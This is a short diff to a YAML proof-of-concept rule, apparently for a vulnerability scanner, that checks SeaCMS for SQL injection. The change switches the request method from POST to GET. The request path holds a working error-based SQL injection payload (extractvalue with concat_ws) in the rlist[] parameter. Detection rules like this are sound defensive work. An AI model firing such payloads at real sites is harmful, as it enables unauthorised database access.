@@ -1,6 +1,6 @@
 name: poc-yaml-seacms-sqli
 rules:
-  - method: POST
+  - method: GET
     path: /comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(202072102)))),@`%27`
     follow_redirects: true
     expression: >
